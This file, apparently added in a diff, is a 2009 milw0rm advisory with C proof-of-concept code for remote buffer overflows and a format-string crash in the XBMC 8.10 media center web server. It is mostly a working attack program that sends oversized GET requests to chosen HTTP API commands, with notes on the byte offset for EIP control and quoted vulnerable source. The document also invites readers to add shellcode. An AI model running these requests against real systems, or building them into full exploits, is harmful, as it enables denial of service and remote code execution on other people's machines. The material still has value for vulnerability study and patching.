@@ -1,0 +1,379 @@
+/*
+XBMC multiple remote buffer overflow vulnerabilities.
+
+XBMC is an award winning media center application for
+Linux, Mac OS X, Windows and XBox. The ultimate hub
+for all your media, XBMC is easy to use, looks slick,
+and has a large helpful community.XBMC has won many
+awards.
+
+Affected version: XBMC 8.10 Atlantis
+Tested on: Windows xpsp3 and linux unbuntu 8.10
+Venders web site : http://xbmc.org/
+Release date:April the 1st 2009
+
+Credits go to n00b for finding the buffer overflow
+and writing simple yet effective poc code.
+Shout's to every one that knows me and have helped over
+the years.
+
+Please if u do wish to write a exploit for the buffer
+overflow please give credits.
+also you will have to filter the bad chars from
+shellcode if you do wish to write exploit for the
+voulnrabilitys in this advisory.
+
+----------
+Disclaimer
+----------
+The information in this advisory and any of its
+demonstrations is provided "as is" without any
+warranty of any kind.
+
+I am not liable for any direct or indirect damages
+caused as a result of using the information or
+demonstrations provided in any part of this advisory.
+Educational use only..!!
+
+You can call by my blog to leave comments and feed back
+and ask any questions you would like.Should be up
+and runing in a few days.
+
+[--]
+http://n00b-n00b.blogspot.com/
+[--]
+
+This poc code was writen on linux using gcc-4.* to compile.
+*/
+
+#include <stdio.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+
+/*Just enough recived buffer to allow for the server banner!!*/
+
+#define BUFFSIZE 32
+
+
+void error(char *mess)
+{
+    perror(mess);
+    exit(1);
+}
+
+int main(int argc, char *argv[])
+{
+    int sock;
+    int input;
+    struct sockaddr_in http_client;
+    char buffer[BUFFSIZE];
+
+    /*You may need to add more buffer on linux versions!!
+      on windows its <1010> bytes to own eip next 4 bytes
+      are loaded into the $esp register.*/
+    char buffer1[1500];
+
+    unsigned int http_len;
+    int received = 0;
+
+    /* If there is more than 2 arguments passed print usage!!*/
+    if (argc != 3)
+    {
+        fprintf(stderr,"USAGE: Server_ip port\n");
+        exit(1);
+    }
+
+    /* Create socket */
+    if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0)
+    {
+        error("Cant create socket");
+    }
+
+
+    /* Construct sockaddr */
+    memset(&http_client, 0, sizeof(http_client));
+    http_client.sin_family = AF_INET;
+    http_client.sin_addr.s_addr = inet_addr(argv[1]);
+    http_client.sin_port = htons(atoi(argv[2]));
+
+    /* Establish connection */
+    if (connect(sock,
+                (struct sockaddr *) &http_client,
+                sizeof(http_client)) < 0)
+    {
+        error("Failed to connect with remote host");
+    }
+
+    /*We need to Construct all the voulnrable request togeather*/
+    memset( buffer1, 0x41, sizeof(buffer1) - 1 );
+
+    printf( "----------------------------------------------------------------\n" );
+    printf( "XBMC remote buffer overflow poc code by  n00b !!\n" );
+    printf( "----------------------------------------------------------------\n" );
+    printf( "[1]. Get request buffer overflow poc !!\n" );
+    printf( "[2]. Get /xbmcHttp?command=takescreenshot buffer overflow !!\n" );
+    printf( "[3]. Get /xbmcHttp?command=GetTagFromFilename buffer overflow !!\n" );
+    printf( "[4]. queryvideodatabase possible format string poc !!\n" );
+    printf( "----------------------------------------------------------------\n" );
+    printf( "----------------------------------------------------------------\n" );
+    printf( "[5]. Cancel and quit application !!\n" );
+    printf( "----------------------\n" );
+    printf( "Pick your http request: " );
+    scanf( "%d", &input );
+    switch ( input )
+    {
+    case 1:
+        memcpy ( buffer1, "GET /", 5);
+        memcpy ( buffer1 +(sizeof(buffer1) - 1) - 21, ".asp HTTP/1.1\r\n\r\n", 21);
+        break;
+    case 2:
+        memcpy ( buffer1, "GET /xbmcCmds/xbmcHttp?command=takescreenshot(", 46);
+        memcpy ( buffer1 +(sizeof(buffer1) - 1) - 41, ".jpg;false;0;300;200;90) HTTP/1.1\r\n\r\n", 41);
+        break;
+    case 3:
+        memcpy ( buffer1, "GET /xbmcCmds/xbmcHttp?command=GetTagFromFilename(C:/", 53);
+        memcpy ( buffer1 +(sizeof(buffer1) - 1) - 23, ".mp3) HTTP/1.1\r\n\r\n", 23);
+        break;
+    case 4:
+        memcpy ( buffer1, "GET /xbmcCmds/xbmcHttp?command=queryvideodatabase(%s%s%s%s) HTTP/1.1\r\n\r\n", 76);
+        break;
+    case 5:
+        exit(0);
+        break;
+    }
+
+
+    /* Send our get request to the server*/
+    http_len = strlen(buffer1);
+    if (send(sock, buffer1, http_len, 0) != http_len)
+    {
+        error("No byte's where sent to remote host check Get request !!");
+    }
+
+
+    /* Receive the current state of the server*/
+    fprintf(stdout, "Received: ");
+    while (received < http_len)
+    {
+        int bytes = 0;
+        if ((bytes = recv(sock, buffer, BUFFSIZE-1, 0)) < 1)
+        {
+            error("Was the banner received?? if no banner exploit was successfull!!");
+        }
+        received += bytes;
+        buffer[bytes] = '\0';
+        fprintf(stdout, buffer);
+    }
+
+    fprintf(stdout, "\n");
+    close(sock);
+    exit(0);
+}
+
+
+/*
+A basic run down of the bugs found with a basic discription.!!
+
+
+(1)..(Get request WebsHomePageHandler buffer overflow)..
+
+I was able to track down most of the vulnerable code.All this info
+was collected on a window's system.
+
+The first buffer overflow i found in the xbmc application all is
+required was for me to make a simple get request by adding 1033 bytes
+of user supplied data to the request.We are now able to gain control of the
+$eip register and the next four bytes on the stack is where our $esp register
+is pointing.
+
+
+--snip--
+
+
+Source of WebsHomePageHandler..\XBMC\xbmc\lib\libGoAhead\WebServer.cpp
+
+
+
+
+        Home page handler
+
+static int websHomePageHandler(webs_t wp, char_t *urlPrefix, char_t *webDir,
+int arg, char_t *url, char_t *path, char_t *query)
+{
+
+       If the empty or "/" URL is invoked, redirect default URLs to the home page
+
+        char dir[1024];
+        char files[][20] = {
+                        {"index.html"},
+                        {"index.htm"},
+                        {"home.htm"},
+                        {"home.html"},
+                        {"default.asp"},
+                        {"home.asp"},
+                        {'\0' }
+                    };
+
+
+
+
+        strcpy(dir, websGetDefaultDir());
+        strcat(dir, path);
+        for(u_int pos = 0; pos < strlen(dir); pos++)
+if (dir[pos] == '/') dir[pos] = '\\';
+
+DWORD attributes = GetFileAttributes(dir);
+if (FILE_ATTRIBUTE_DIRECTORY == attributes)
+{
+int i = 0;
+char buf[1024];
+while (files[i][0])
+{
+strcpy(buf, dir);
+if (buf[strlen(buf)-1] != '\\') strcat(buf, "\\");
+strcat(buf, files[i]);
+
+if (!access(buf, 0))
+{
+strcpy(buf, path);
+if (path[strlen(path)-1] != '/') strcat(buf, "/");
+strcat(buf, files[i]);
+websRedirect(wp, buf);
+return 1;
+}
+i++;
+}
+
+
+--snip--
+
+
+the next set of voulnrabilitys are exploited through 
+the "Web Server HTTP API".
+more information can be read at the following link.
+I wrote a simple fuzzer and fuzzed all the commands that
+where passed through the http requests.
+
+
+http://xbmc.org/wiki/?title=WebServerHTTP-API
+
+
+(2)..(takescreenshot remote buffer overflow)..
+
+please visit the above link for more information
+on specific command's.This is also a classic buffer
+overflow where we can add a long file name to the
+takescreenshot command and pass it to the API.
+once again we can over flow the static allocated
+buffer on the stack and let us own the application
+flow.Thus letting us execute our own supplied data.
+Also as a side note to this buffer overflow
+there are different registers over wrote.
+
+...\XBMC\xbmc\cores\DllLoader\exports\emu_msvcrt.cpp
+
+--snip--
+
+
+int dll_open(const char* szFileName, int iMode)
+  {
+    char str[XBMC_MAX_PATH];
+
+    // move to CFile classes
+    if (strncmp(szFileName, "\\Device\\Cdrom0", 14) == 0)
+    {
+      // replace "\\Device\\Cdrom0" with "D:"
+      strcpy(str, "D:");
+      strcat(str, szFileName + 14);
+    }
+    else strcpy(str, szFileName);
+
+    CFile* pFile = new CFile();
+    bool bBinary = false;
+    if (iMode & O_BINARY)
+      bBinary = true;
+    bool bWrite = false;
+    if ((iMode & O_RDWR) || (iMode & O_WRONLY))
+      bWrite = true;
+    bool bOverwrite=false;
+    if ((iMode & _O_TRUNC) || (iMode & O_CREAT))
+      bOverwrite = true;
+    // currently always overwrites
+    bool bResult;
+    if (bWrite)
+      bResult = pFile->OpenForWrite(_P(str), bBinary, bOverwrite);
+    else
+      bResult = pFile->Open(_P(str), bBinary);
+    if (bResult)
+    {
+      EmuFileObject* object = g_emuFileWrapper.RegisterFileObject(pFile);
+      if (object == NULL)
+      {
+        VERIFY(0);
+        pFile->Close();
+        delete pFile;
+        return -1;
+      }
+      return g_emuFileWrapper.GetDescriptorByStream(&object->file_emu);
+    }
+    delete pFile;
+    return -1;
+  }
+
+--snip--
+
+We also know that szFileName is defind in a headerfile with
+1024 bytes staticaly allocated.So if we passs more the 1024 byte's we can cause
+stack corruption and over write the $eip also give's us a choice of registers
+we can use for our shell code.
+
+
+
+(3)..(GetTagFromFilename remote buffer overflow)..
+
+The buffer over flow is when parsing a id3 tag
+the difference is the registers that are over wrote
+at the time of access violation are as follow's.Im not
+going to list all the source for all the exceptions.
+This poc is big enough already with out adding more
+information and its simple to set up XBMC and compile
+on your own machine..
+
+
+
+(4)..(Sqlite queryvideodatabase)..
+
+Just results in denial of service no more information available
+maybe ill look more into sqllite3 in the future.
+
+[--]
+/xbmcCmds/xbmcHttp?command=queryvideodatabase(%s%s%s%s)
+[--]
+
+All the above vulnerability's where tested on linux and windows
+On linux unbuntu 8.10 using strace to debug.And on windows
+i used visual c++ express 2008.This poc code is just a simple
+poc code to show the vulnerability's i found within the XBMC
+application.
+
+it started off as closed source analysis.Although
+the application was tested there are still a lot of other
+possibility for exploitation.Even the login for the web server
+could be vulnerable to a buffer overflow.
+
+Also worth a mention is i could take controll over the XBMC 
+web server and there would be no error messages or any thing to 
+sugest that the server had been took offline but it carrys on as 
+normal the rest of xbmc stays the same with out any changes.
+It looks like it just terminates the thread and leaving the 
+rest of the application intact and continues to run
+like normal.
+
+
+*/
+
+// milw0rm.com [2009-04-01]
